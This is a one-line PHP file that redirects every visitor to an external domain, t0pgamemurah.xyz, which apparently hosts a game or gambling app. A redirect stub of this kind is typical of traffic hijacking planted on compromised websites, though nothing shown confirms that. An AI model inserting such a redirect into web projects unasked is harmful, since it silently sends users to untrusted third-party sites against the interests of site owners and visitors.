<?php

header('Location: https://t0pgamemurah.xyz/app/');